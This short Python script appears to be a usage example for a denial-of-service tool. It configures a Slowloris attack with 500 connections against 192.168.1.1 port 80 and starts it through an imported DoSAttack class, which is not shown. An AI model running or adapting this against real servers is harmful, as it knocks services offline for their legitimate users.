from src.dos_attack import DoSAttack  # change this to import from panthon

dos = DoSAttack(
    "192.168.1.1", 80, 500, "Slowloris"
)  # target IP, target port, number of connections, type of attack
dos.simulate_attack()
dos.wait_for_threads()
